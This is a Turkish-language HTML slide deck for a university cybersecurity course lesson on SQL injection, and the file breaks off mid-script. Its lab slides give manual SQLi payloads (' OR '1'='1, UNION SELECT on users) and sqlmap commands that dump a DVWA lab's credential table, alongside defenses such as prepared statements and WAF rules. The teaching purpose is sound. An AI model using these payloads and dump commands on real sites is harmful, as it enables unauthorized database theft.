@@ -1,0 +1,677 @@
+<!DOCTYPE html>
+<html lang="tr" data-theme="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Siber Saldırı ve Savunma Yöntemleri - Hafta 11 Sunumu | ezfesoft 26-27 Güz</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Fira+Code:wght@400;500;600&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-primary: #0f172a;
+            --bg-card: rgba(30, 41, 59, 0.75);
+            --bg-card-border: rgba(255, 255, 255, 0.12);
+            --text-primary: #f8fafc;
+            --text-secondary: #94a3b8;
+            --accent-color: #f43f5e;
+            --accent-glow: #f43f5e40;
+            --code-bg: #090d16;
+            --nav-bg: rgba(15, 23, 42, 0.85);
+            --radius: 16px;
+        }
+
+        [data-theme="light"] {
+            --bg-primary: #f1f5f9;
+            --bg-card: rgba(255, 255, 255, 0.92);
+            --bg-card-border: rgba(0, 0, 0, 0.08);
+            --text-primary: #0f172a;
+            --text-secondary: #475569;
+            --code-bg: #1e293b;
+            --nav-bg: rgba(241, 245, 249, 0.85);
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Inter', system-ui, -apple-system, sans-serif;
+            background-color: var(--bg-primary);
+            color: var(--text-primary);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+            user-select: none;
+            transition: background-color 0.3s ease, color 0.3s ease;
+        }
+
+        /* Header / Top Progress */
+        .top-bar {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 60px;
+            background: var(--nav-bg);
+            backdrop-filter: blur(12px);
+            border-bottom: 1px solid var(--bg-card-border);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 24px;
+            z-index: 100;
+        }
+
+        .progress-container {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 4px;
+            background: rgba(255,255,255,0.05);
+        }
+
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, var(--accent-color), #38bdf8);
+            width: 0%;
+            transition: width 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .course-badge {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-weight: 700;
+            font-size: 1.05rem;
+            color: var(--text-primary);
+            text-decoration: none;
+        }
+
+        .badge-pill {
+            background: var(--accent-glow);
+            color: var(--accent-color);
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            font-weight: 600;
+            border: 1px solid var(--accent-color);
+        }
+
+        .header-actions {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .btn-icon {
+            background: var(--bg-card);
+            border: 1px solid var(--bg-card-border);
+            color: var(--text-primary);
+            width: 38px;
+            height: 38px;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            font-size: 1.1rem;
+        }
+
+        .btn-icon:hover {
+            background: var(--accent-color);
+            color: #fff;
+            transform: translateY(-1px);
+        }
+
+        /* Slide Viewport */
+        .slide-container {
+            flex: 1;
+            margin-top: 60px;
+            margin-bottom: 70px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 24px;
+            position: relative;
+        }
+
+        .slide-card {
+            width: 100%;
+            max-width: 1100px;
+            min-height: 520px;
+            max-height: calc(100vh - 160px);
+            background: var(--bg-card);
+            backdrop-filter: blur(16px);
+            border: 1px solid var(--bg-card-border);
+            border-radius: var(--radius);
+            padding: 40px 48px;
+            display: flex;
+            flex-direction: column;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.3);
+            overflow-y: auto;
+            position: relative;
+            animation: slideIn 0.35s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateY(12px) scale(0.98); }
+            to { opacity: 1; transform: translateY(0) scale(1); }
+        }
+
+        .slide-header {
+            margin-bottom: 20px;
+            border-bottom: 2px solid var(--bg-card-border);
+            padding-bottom: 16px;
+        }
+
+        .slide-meta {
+            font-size: 0.85rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            color: var(--accent-color);
+            font-weight: 700;
+            margin-bottom: 6px;
+        }
+
+        .slide-title {
+            font-size: 2.1rem;
+            font-weight: 800;
+            line-height: 1.25;
+            background: linear-gradient(135deg, var(--text-primary) 40%, var(--accent-color));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .slide-subtitle {
+            font-size: 1.15rem;
+            color: var(--text-secondary);
+            font-weight: 500;
+            margin-top: 6px;
+        }
+
+        .slide-body {
+            flex: 1;
+            font-size: 1.1rem;
+            line-height: 1.7;
+            color: var(--text-primary);
+        }
+
+        /* Content Formatting */
+        .content-paragraph {
+            margin-bottom: 14px;
+            white-space: pre-line;
+        }
+
+        .content-list {
+            list-style: none;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin: 16px 0;
+        }
+
+        .content-list-item {
+            background: rgba(255,255,255,0.03);
+            border-left: 4px solid var(--accent-color);
+            padding: 12px 18px;
+            border-radius: 0 10px 10px 0;
+            font-size: 1.05rem;
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+        }
+
+        .content-list-item::before {
+            content: "✦";
+            color: var(--accent-color);
+            font-weight: bold;
+        }
+
+        .step-badge {
+            background: var(--accent-color);
+            color: #fff;
+            width: 26px;
+            height: 26px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.85rem;
+            font-weight: 700;
+            flex-shrink: 0;
+        }
+
+        .code-block {
+            background: var(--code-bg);
+            border: 1px solid var(--bg-card-border);
+            border-radius: 12px;
+            padding: 16px 20px;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.95rem;
+            color: #38bdf8;
+            overflow-x: auto;
+            margin: 16px 0;
+            white-space: pre-wrap;
+            user-select: text;
+        }
+
+        .visual-box {
+            margin-top: 20px;
+            background: rgba(0,0,0,0.2);
+            border: 1px dashed var(--accent-color);
+            border-radius: 12px;
+            padding: 16px;
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            color: var(--text-secondary);
+            font-size: 0.95rem;
+        }
+
+        /* Bottom Nav Controller */
+        .bottom-nav {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            height: 70px;
+            background: var(--nav-bg);
+            backdrop-filter: blur(12px);
+            border-top: 1px solid var(--bg-card-border);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 24px;
+            z-index: 100;
+        }
+
+        .nav-center {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .btn-nav {
+            background: var(--accent-glow);
+            color: var(--accent-color);
+            border: 1px solid var(--accent-color);
+            padding: 10px 20px;
+            border-radius: 10px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .btn-nav:hover:not(:disabled) {
+            background: var(--accent-color);
+            color: #fff;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px var(--accent-glow);
+        }
+
+        .btn-nav:disabled {
+            opacity: 0.3;
+            cursor: not-allowed;
+            border-color: transparent;
+        }
+
+        .slide-counter {
+            font-weight: 700;
+            font-size: 1.05rem;
+            min-width: 90px;
+            text-align: center;
+            background: var(--bg-card);
+            padding: 8px 16px;
+            border-radius: 20px;
+            border: 1px solid var(--bg-card-border);
+        }
+
+        /* Overview Modal */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.85);
+            backdrop-filter: blur(10px);
+            z-index: 200;
+            display: none;
+            padding: 40px;
+            overflow-y: auto;
+        }
+
+        .modal-overlay.active {
+            display: block;
+        }
+
+        .modal-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 24px;
+            max-width: 1200px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .grid-overview {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(240px, 1fr));
+            gap: 16px;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .thumb-card {
+            background: var(--bg-card);
+            border: 1px solid var(--bg-card-border);
+            border-radius: 12px;
+            padding: 16px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            height: 140px;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+
+        .thumb-card:hover, .thumb-card.active {
+            border-color: var(--accent-color);
+            transform: scale(1.03);
+            box-shadow: 0 6px 20px var(--accent-glow);
+        }
+
+        .thumb-num {
+            font-size: 0.8rem;
+            font-weight: 700;
+            color: var(--accent-color);
+        }
+
+        .thumb-title {
+            font-size: 0.95rem;
+            font-weight: 600;
+            line-height: 1.3;
+            display: -webkit-box;
+            -webkit-line-clamp: 3;
+            -webkit-box-orient: vertical;
+            overflow: hidden;
+        }
+
+        @media (max-width: 768px) {
+            .slide-card {
+                padding: 24px;
+                min-height: 440px;
+            }
+            .slide-title {
+                font-size: 1.5rem;
+            }
+            .bottom-nav {
+                padding: 0 12px;
+            }
+            .btn-nav span {
+                display: none;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Top Navigation Bar -->
+    <header class="top-bar">
+        <div class="progress-container">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
+        <a href="../../README.md" class="course-badge">
+            <span>🛡️</span>
+            <span>Siber Saldırı ve Savunma Yöntemleri</span>
+            <span class="badge-pill">Hafta 11</span>
+        </a>
+        <div class="header-actions">
+            <button class="btn-icon" id="themeToggle" title="Temayı Değiştir (T)">☀️</button>
+            <button class="btn-icon" id="overviewToggle" title="Slayt Haritası (M / O)">📑</button>
+            <button class="btn-icon" id="fullscreenToggle" title="Tam Ekran (F)">⛶</button>
+        </div>
+    </header>
+
+    <!-- Main Presentation Slide Area -->
+    <main class="slide-container">
+        <div class="slide-card" id="slideCard">
+            <div class="slide-header">
+                <div class="slide-meta" id="slideMeta">SLAYT 1 / 32 • Siber Güvenlik & SOC</div>
+                <h1 class="slide-title" id="slideTitle">Yükleniyor...</h1>
+                <h2 class="slide-subtitle" id="slideSubtitle"></h2>
+            </div>
+            <div class="slide-body" id="slideBody">
+                <!-- Slide content injected by JS -->
+            </div>
+        </div>
+    </main>
+
+    <!-- Bottom Navigation Dock -->
+    <footer class="bottom-nav">
+        <div style="display: flex; gap: 8px;">
+            <a href="hafta-10.html" class="btn-nav" style="text-decoration:none;" >
+                <span>◀ Önceki Hafta</span>
+            </a>
+            <a href="../index.html" class="btn-nav" style="text-decoration:none;">
+                <span>📚 Ders Kataloğu</span>
+            </a>
+        </div>
+
+        <div class="nav-center">
+            <button class="btn-nav" id="prevBtn">
+                <span>◀</span> <span>Önceki</span>
+            </button>
+            <div class="slide-counter" id="slideCounter">1 / 32</div>
+            <button class="btn-nav" id="nextBtn">
+                <span>Sonraki</span> <span>▶</span>
+            </button>
+        </div>
+
+        <div style="display: flex; gap: 8px;">
+            <a href="hafta-12.html" class="btn-nav" style="text-decoration:none;" >
+                <span>Sonraki Hafta ▶</span>
+            </a>
+        </div>
+    </footer>
+
+    <!-- Overview Modal Grid -->
+    <div class="modal-overlay" id="overviewModal">
+        <div class="modal-header">
+            <h2>Slayt Haritası (32 Slayt)</h2>
+            <button class="btn-icon" id="closeModal">✕</button>
+        </div>
+        <div class="grid-overview" id="gridOverview"></div>
+    </div>
+
+    <script>
+        const slides = [{"baslik": "Siber Güvenlik: Hafta 11", "altbaslik": "Web Uygulama Güvenliğine Giriş ve SQL Injection", "icerik": "Program: Bilişim Güvenliği Teknolojisi\nModül: Web Güvenliği ve Veritabanı İstismarı\nHaftalık Odak: OWASP Top 10, Web Mimarisi, SQLi Mantığı ve SQLMap ile Veri Sızdırma\nHedef: Web zafiyetlerini analiz etmek ve SQL Injection açıklarını sömürüp kapatmak.", "gorsel": {"type": "image", "query": "sql injection web application security database hacking"}}, {"baslik": "Neden Bu Konuyu Öğreniyoruz?", "altbaslik": "Sektörel Bağlam: Dünyanın En Yaygın Saldırı Yüzeyi Web", "icerik": "E-ticaret, e-Devlet ve bankacılık sistemlerinin tamamı web tarayıcıları üzerinden hizmet verir.\n- Web sunucusu dünyaya açık olduğu için saldırganların ilk hedefidir.\n- SQL Injection zafiyeti doğrudan şirketin tüm müşteri veritabanını dışarı aktarır.\nWeb güvenliğini bilmeyen bir uzman tam teşekküllü pentest yapamaz.", "gorsel": {"type": "image", "query": "web developer security analyst database breach"}}, {"baslik": "Haftanın Öğrenme Kazanımları", "altbaslik": "Bu Dersin Sonunda Neler Kazanacaksınız?", "icerik": "1. Web mimarisini ve HTTP protokolü isteklerini (GET/POST) açıklar.\n2. OWASP Top 10 zafiyet sıralamasını ve etki alanlarını kavrar.\n3. SQL Injection zafiyetinin oluşum nedenini matematiksel olarak açıklar.\n4. Tarayıcı üzerinden manuel SQLi (' OR '1'='1) testleri yapar.\n5. SQLMap aracı ile otomatik veritabanı tespiti ve veri dökümü (--dump) uygular.", "gorsel": {"type": "image", "query": "learning objectives web security checklist"}}, {"baslik": "Web Mimarisi ve HTTP Protokolü", "altbaslik": "İstemci, Sunucu ve Veritabanı Üçgeni", "icerik": "İstemci (Tarayıcı) -> [HTTP GET/POST İsteği] -> [Web Sunucusu (Apache/IIS)]\n                                                     |\n                                               [SQL Sorgusu]\n                                                     v\n                                           [Veritabanı (MySQL/MSSQL)]\n- GET: Parametreler URL içinde taşınır (?id=1&kategori=kitap).\n- POST: Veriler istek gövdesinde gizli taşınır (Giriş formları).", "gorsel": {"type": "image", "query": "web client server database architecture http request diagram"}}, {"baslik": "HTTP Durum Kodları (Status Codes)", "altbaslik": "Sunucunun Bize Verdiği Yanıtlar", "icerik": "- 200 OK: İstek başarılı, sayfa yüklendi.\n- 301/302 Redirect: Sayfa başka bir adrese yönlendirildi.\n- 403 Forbidden: Erişim yetkiniz yok, yasak!\n- 404 Not Found: Aranan sayfa sunucuda bulunamadı.\n- 500 Internal Server Error: Sunucu tarafında yazılım/kod hatası oluştu (SQLi ipucu!).", "gorsel": {"type": "image", "query": "http status codes 200 404 500 error screen icons"}}, {"baslik": "OWASP Top 10 Nedir?", "altbaslik": "Küresel Web Güvenliği Standardı", "icerik": "OWASP (Open Web Application Security Project), dünya çapında en kritik 10 web güvenlik açığını listeleyen bağımsız kuruluştur.\n2021-2026 Zirvesi:\n- A01: Broken Access Control (Hatalı Yetkilendirme)\n- A02: Cryptographic Failures (Kriptografik Hatalar)\n- A03: Injection (SQLi, Komut Enjeksiyonu)\n- A04: Insecure Design (Güvensiz Tasarım)\n- A05: Security Misconfiguration (Hatalı Yapılandırma)", "gorsel": {"type": "image", "query": "owasp top 10 vulnerabilities logo list web security"}}, {"baslik": "SQL Injection (SQLi) Nasıl Oluşur?", "altbaslik": "Kullanıcı Girdisine Güvenme Hatası", "icerik": "Geliştiricinin yazdığı arka plan kodu:\nSELECT * FROM users WHERE id = '$id';\nKullanıcı girdi kutusuna şunu yazarsa: 1' OR '1'='1\nOluşan son SQL sorgusu:\nSELECT * FROM users WHERE id = '1' OR '1'='1';\nSonuç:\n'1'='1' mantıksal olarak daima DOĞRU (TRUE) olduğu için veritabanı tüm kullanıcı kayıtlarını ve parolalarını ekrana döker!", "gorsel": {"type": "image", "query": "sql injection code snippet query explanation diagram"}}, {"baslik": "SQL Injection Türleri", "altbaslik": "In-band, Inferential ve Out-of-band", "icerik": "1. In-band (Klasik SQLi): Sonuçlar doğrudan web sayfasında ekrana basılır (Union-based, Error-based).\n2. Inferential (Kör / Blind SQLi): Ekranda veri görünmez; veritabanına True/False soruları sorularak veya sunucu uyutularak (Time-based: SLEEP(5)) veri karakter karakter çekilir.\n3. Out-of-band: Veriler DNS sorguları veya e-posta yoluyla dışarı sızdırılır.", "gorsel": {"type": "image", "query": "sql injection types union based blind error based diagram"}}, {"baslik": "SQLMap: Otomatize Veritabanı Ele Geçirme", "altbaslik": "Veritabanının Korkulu Rüyası", "icerik": "SQLMap, web parametrelerindeki SQLi açıklarını otomatik tespit edip sömüren dünyanın 1 numaralı aracıdır.\nNeler Yapar?\n- Hedef veritabanı türünü (MySQL, Oracle, MSSQL) ve sürümünü bulur.\n- Tüm veritabanı isimlerini listeler (--dbs).\n- Tabloları ve kolonları listeler (--tables, --columns).\n- Parolaları ve tüm verileri indirir (--dump).", "gorsel": {"type": "image", "query": "sqlmap logo terminal database penetration testing"}}, {"baslik": "Temel SQLMap Parametreleri", "altbaslik": "Komut Satırı Sözdizimi", "icerik": "- -u <URL> : Zafiyetli web adresi\n- --cookie=\"...\" : Giriş yapılmış oturum çerezleri\n- --dbs : Veritabanlarını listele\n- -D <db_adi> : Hedef veritabanını seç\n- --tables : Tabloları getir\n- -T <tablo_adi> : Hedef tabloyu seç\n- -C user,password : Belirli kolonları seç\n- --dump : Verileri indir\n- --batch : Sorulan tüm sorulara varsayılan Evet de", "gorsel": {"type": "image", "query": "sqlmap cheat sheet command line parameters options"}}, {"baslik": "SQL Injection Savunması: Prepared Statements", "altbaslik": "Açığı Kökten Kapatan Çözüm", "icerik": "Hatalı Yaklaşım: String birleştirme (query = 'SELECT * FROM users WHERE id=' + input).\nDoğru ve Kesin Çözüm: Parametrik Sorgular (Prepared Statements / PDO).\nVeritabanı kullanıcı girdisini bir SQL KOMUTU olarak değil, salt bir METİN (Data) olarak işler; tırnak işaretleri kodu kıramaz!", "gorsel": {"type": "image", "query": "prepared statements parameterized queries secure coding pdo"}}, {"baslik": "Uygulama Laboratuvarı: DVWA SQLi", "altbaslik": "Laboratuvar Hedeflerimiz", "icerik": "Laboratuvarımızda:\n- Web Hedefi: http://192.168.1.20/dvwa (Sunucu 2 üzerinde koşan DVWA)\n1. DVWA'ya giriş yapıp Security seviyesini 'Low' yapacağız.\n2. Tarayıcıdan manuel SQLi (' OR '1'='1) deneyeceğiz.\n3. SQLMap ile DVWA veritabanını tespit edip users tablosunu indireceğiz.", "gorsel": {"type": "image", "query": "students web hacking laboratory dvwa kali linux"}}, {"baslik": "Uygulama 1: DVWA Laboratuvarına Giriş", "altbaslik": "Oturum Açma ve Seviye Ayarı", "icerik": "Adım 1: Kali Firefox tarayıcısını açıp şu adrese gidin:\nhttp://192.168.1.20/dvwa/login.php\nKullanıcı Adı: admin | Parola: password\nAdım 2: Sol menüden 'DVWA Security' sekmesine tıklayın, seviyeyi 'Low' seçip Submit butonuna basın.", "gorsel": {"type": "image", "query": "dvwa login page interface firefox browser"}}, {"baslik": "Uygulama 2: Manuel SQL Injection Testi", "altbaslik": "Tarayıcıdan Veri Dökmek", "icerik": "Adım 1: Sol menüden 'SQL Injection' sekmesine tıklayın.\nAdım 2: User ID kutusuna 1 yazıp Submit deyin (Sadece admin gelir).\nAdım 3: Şimdi kutunun içine şu zararlı payload'u yazın:\n1' OR '1'='1\nSubmit butonuna basın!\nSonuç: Sistemdeki tüm kullanıcıların isimleri tek seferde ekrana dökülecektir!", "gorsel": {"type": "image", "query": "dvwa sql injection form manual payload input"}}, {"baslik": "Uygulama 3: SQLMap ile Veritabanlarını Bulma", "altbaslik": "--dbs Parametresi", "icerik": "Terminali açın ve tarayıcı çerezinizle birlikte sqlmap'i çalıştırın:\nsqlmap -u \"http://192.168.1.20/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit\" \\\n--cookie=\"security=low; PHPSESSID=BURAYA_COOKIE_DEGERINIZ\" \\\n--batch --dbs\nBeklenen Çıktı: available databases [2]: [*] dvwa, [*] information_schema", "gorsel": {"type": "image", "query": "sqlmap dbs command output terminal database list"}}, {"baslik": "Uygulama 4: Tabloları Listeleme", "altbaslik": "-D dvwa --tables", "icerik": "dvwa veritabanındaki tabloları çekelim:\nsqlmap -u \"http://192.168.1.20/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit\" \\\n--cookie=\"security=low; PHPSESSID=BURAYA_COOKIE_DEGERINIZ\" \\\n-D dvwa --tables --batch\nBeklenen Çıktı: Database: dvwa -> [2 tables]: [+] guestbook, [+] users", "gorsel": {"type": "image", "query": "sqlmap tables command output terminal users table"}}, {"baslik": "Uygulama 5: Parolaları İndirme (Dump)", "altbaslik": "-T users --dump", "icerik": "users tablosundaki kullanıcı ve parola kolonlarını indirelim:\nsqlmap -u \"http://192.168.1.20/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit\" \\\n--cookie=\"security=low; PHPSESSID=BURAYA_COOKIE_DEGERINIZ\" \\\n-D dvwa -T users -C user,password --dump --batch\nBeklenen Tablo:\nadmin | 5f4dcc3b5aa765d61d8327deb882cf99 (password)", "gorsel": {"type": "image", "query": "sqlmap dump output table credentials cracked"}}, {"baslik": "Sık Yapılan Hatalar ve İpuçları", "altbaslik": "SQLMap Kullanımında Dikkat Edilecekler", "icerik": "1. 302 Yönlendirme Hatası: PHPSESSID çerezi eksikse sayfa login.php'ye yönlenir ve tarama başarısız olur.\n2. Çerezi Bulma: Tarayıcıda F12 -> Storage / Depolama -> Cookies sekmesinden PHPSESSID değeri kopyalanmalıdır.\n3. URL Tırnakları: URL içinde & ve ? karakterleri olduğu için URL mutlaka çift tırnak içine alınmalıdır.", "gorsel": {"type": "image", "query": "troubleshooting sqlmap cookies checklist warning"}}, {"baslik": "Sektörel Vaka: TalkTalk SQLi Felaketi", "altbaslik": "16 Yaşındaki Hacker ve 150.000 Mağdur", "icerik": "Vaka: İngiltere'nin dev telekom şirketi TalkTalk hacklendi ve 150.000 müşterinin banka detayları çalındı.\nİnceleme: Saldırganlar şirketin eski bir web sayfasındaki basit bir SQL Injection açığını SQLMap ile sömürdü.\nSonuç: Şirket 42 milyon sterlin mali kayıp ve 400.000 sterlin rekor regülasyon cezası ödedi.", "gorsel": {"type": "image", "query": "talktalk data breach news telecom cyber attack"}}, {"baslik": "Vaka Analizi: Güvenli Yazılım Geliştirme (SSDLC)", "altbaslik": "Çıkarılan Mühendislik Dersi", "icerik": "Ders: Güvenlik projenin sonuna değil, en başına (Tasarım ve Kodlama aşamasına) entegre edilmelidir.\n- Statik Kod Analizi (SAST): Kod yazılırken SQLi açıkları otomatik taranmalıdır.\n- Dinamik Testler (DAST): Canlıya çıkmadan önce SQLMap gibi araçlarla sızma testleri yapılmalıdır.", "gorsel": {"type": "image", "query": "secure software development lifecycle ssdlc devsecops"}}, {"baslik": "Mini Quiz: Soru 1", "altbaslik": "Web Zafiyetleri", "icerik": "Soru: Kullanıcı girdisinin filtrelenmeden doğrudan SQL sorgusuna eklenmesi sonucu oluşan web açığına ne ad verilir?\nA) XSS\nB) SQL Injection (SQLi)\nC) DoS\nD) Brute Force\n\nDoğru Cevap: B (SQL Injection)", "gorsel": {"type": "image", "query": "quiz question multiple choice exam board"}}, {"baslik": "Mini Quiz: Soru 2", "altbaslik": "HTTP Protokolü", "icerik": "Soru: Parametrelerin URL adresinde açıkça taşındığı HTTP istek türü hangisidir?\nA) POST\nB) GET\nC) PUT\nD) DELETE\n\nDoğru Cevap: B (GET)", "gorsel": {"type": "image", "query": "http get post question multiple choice"}}, {"baslik": "Mini Quiz: Soru 3", "altbaslik": "SQLMap Parametreleri", "icerik": "Soru: SQLMap aracında hedef tablodaki tüm verileri indirip ekrana tablo halinde döken parametre hangisidir?\nA) --scan\nB) --dump\nC) --delete\nD) --test\n\nDoğru Cevap: B (--dump)", "gorsel": {"type": "image", "query": "sqlmap dump parameter question test"}}, {"baslik": "Mini Quiz: Soru 4", "altbaslik": "Güvenli Kodlama", "icerik": "Soru: Yazılım geliştiricilerin SQL Injection açığını tamamen kapatmak için kullanması gereken sorgu mimarisi hangisidir?\nA) Düz String Birleştirme\nB) Prepared Statements (Parametrik Sorgular)\nC) Sadece JavaScript Kontrolü\nD) Port Kapatma\n\nDoğru Cevap: B (Prepared Statements)", "gorsel": {"type": "image", "query": "prepared statements secure coding question"}}, {"baslik": "Mini Quiz: Soru 5", "altbaslik": "OWASP Sıralaması", "icerik": "Soru: Web güvenliğinde dünya standartlarını belirleyen ve Top 10 listesini yayınlayan kuruluş hangisidir?\nA) IEEE\nB) OWASP\nC) W3C\nD) ISO\n\nDoğru Cevap: B (OWASP)", "gorsel": {"type": "image", "query": "owasp foundation question board"}}, {"baslik": "Sınıf İçi Tartışma ve Uygulama", "altbaslik": "Veritabanındaki Gizli Bayrağı Bulma", "icerik": "Uygulama Görevi:\nDVWA guestbook tablosunun içine eğitmen tarafından gizli bir parola yerleştirildi.\n- sqlmap -D dvwa -T guestbook --dump komutunu çalıştırın.\n- Gizli metni ilk okuyan öğrenci el kaldırsın!", "gorsel": {"type": "image", "query": "students competition classroom coding linux challenge"}}, {"baslik": "Hatalı Yetkilendirme (Broken Access Control)", "altbaslik": "OWASP A01 Zafiyeti", "icerik": "Broken Access Control, bir kullanıcının yetkisi olmayan sayfalara veya verilere parametre değiştirerek erişebilmesidir.\nÖrnek (IDOR - Insecure Direct Object Reference):\nKullanıcı kendi profiline bakar: /profil.php?id=105\nURL'deki 105'i 106 yapınca başka bir müşterinin gizli verilerini görürse bu bir yetkilendirme açığıdır!", "gorsel": {"type": "image", "query": "broken access control idor parameter tampering diagram"}}, {"baslik": "SQL Injection Korunma: WAF Kuralları", "altbaslik": "ModSecurity ile Savunma", "icerik": "ModSecurity, açık kaynaklı popüler bir WAF (Web Application Firewall) motorudur.\n- Gelen HTTP isteklerindeki ' OR '1'='1 veya UNION SELECT gibi bilinen SQLi imzalarını tespit ettiği anda isteği 403 Forbidden ile engeller.\nWAF kod tarafındaki açıkları kapatmaz ama saldırıyı dışarıda bloke eder.", "gorsel": {"type": "image", "query": "modsecurity waf web firewall blocking sql injection"}}, {"baslik": "Çözümlü Uygulama: Union-Based SQLi", "altbaslik": "Manuel Sütun Sayısı Tespiti", "icerik": "Adım 1: Sütun sayısını bulma (ORDER BY):\n1' ORDER BY 1-- - (Hata vermez)\n1' ORDER BY 2-- - (Hata vermez)\n1' ORDER BY 3-- - (Unknown column hatası! Demek ki 2 sütun var!)\nAdım 2: Veri çekme (UNION SELECT):\n1' UNION SELECT user, password FROM users-- -", "gorsel": {"type": "image", "query": "union based sql injection order by column count diagram"}}, {"baslik": "Haftalık Konu Özeti", "altbaslik": "Bu Hafta Neler Öğrendik?", "icerik": "- Web mimarisinde istemciden gelen hiçbir veriye güvenilmemelidir.\n- SQL Injection veritabanının kontrolünü tamamen saldırgana verir.\n- SQLMap saniyeler içinde tüm tabloları ve şifreleri sızdırabilir.\n- Hazırlıklı İfadeler (Prepared Statements) açığı kapatmanın yegane kesin yoludur.", "gorsel": {"type": "image", "query": "summary concept mind map review"}}, {"baslik": "Gelecek Haftaya Bakış", "altbaslik": "Hafta 12: Ağ ve Servis Parola Saldırıları (Hydra)", "icerik": "Ön Hazırlık:\n- Açık SSH ve FTP portlarına çevrimiçi kaba kuvvet (Brute Force) nasıl yapılır?\n- THC-Hydra aracı nasıl kullanılır?\n- Hesap kilitleme ve Fail2ban savunmaları nasıl çalışır?", "gorsel": {"type": "image", "query": "hydra brute force password attacks network services"}}, {"baslik": "Çıkış Bileti (Exit Ticket)", "altbaslik": "Dersi Bitirmeden Önce Cevaplayınız", "icerik": "Günün Sorusu:\n'Parametrik Sorguların (Prepared Statements) SQL Injection açığını nasıl engellediğini tek bir cümleyle açıklayınız.'\n\nCevabınızı kâğıda yazıp teslim ediniz.", "gorsel": {"type": "image", "query": "exit ticket paper feedback classroom student"}}];
+        let currentIndex = 0;
+
+        const slideTitle = document.getElementById('slideTitle');
+        const slideSubtitle = document.getElementById('slideSubtitle');
+        const slideBody = document.getElementById('slideBody');
+        const slideMeta = document.getElementById('slideMeta');
+        const slideCounter = document.getElementById('slideCounter');
+        const progressBar = document.getElementById('progressBar');
+
+        const prevBtn = document.getElementById('prevBtn');
+        const nextBtn = document.getElementById('nextBtn');
+        const slideCard = document.getElementById('slideCard');
+
+        const themeToggle = document.getElementById('themeToggle');
+        const overviewToggle = document.getElementById('overviewToggle');
+        const overviewModal = document.getElementById('overviewModal');
+        const closeModal = document.getElementById('closeModal');
+        const gridOverview = document.getElementById('gridOverview');
+        const fullscreenToggle = document.getElementById('fullscreenToggle');
+
+        function formatContent(text) {
+            if (!text) return '';
+            const lines = text.split('\n');
+            let html = '';
+            let inList = false;
+
+            lines.forEach((line) => {
+                const trimmed = line.trim();
+                if (!trimmed) return;
+
+                if (trimmed.startsWith('- ') || trimmed.startsWith('* ')) {
+                    if (!inList) {
+                        html += '<ul class="content-list">';
+                        inList = true;
+                    }
+                    html += `<li class="content-list-item">${trimmed.substring(2)}</li>`;
+                }
+                else if (/^\d+\.\s/.test(trimmed)) {
+                    if (inList) {
+                        html += '</ul>';
+                        inList = false;
+                    }
+                    const match = trimmed.match(/^(\d+)\.\s+(.*)/);
+                    if (match) {
+                        html += `<div class="content-list-item"><span class="step-badge">${match[1]}</span><span>${match[2]}</span></div>`;
+                    }
+                }
+                else if (trimmed.includes(';') || trimmed.includes('{') || trimmed.includes('}') || trimmed.includes('print(') || trimmed.includes('def ')) {
+                    if (inList) { html += '</ul>'; inList = false; }
+                    html += `<div class="code-block">${trimmed}</div>`;
+                }
+                else {
+                    if (inList) { html += '</ul>'; inList = false; }
+                    html += `<div class="content-paragraph">${trimmed}</div>`;
+                }
+            });
+
+            if (inList) html += '</ul>';
+            return html;
+        }
+
+        function renderSlide(index) {
+            if (index < 0 || index >= slides.length) return;
+            currentIndex = index;
+            const slide = slides[currentIndex];
+
+            slideCard.style.animation = 'none';
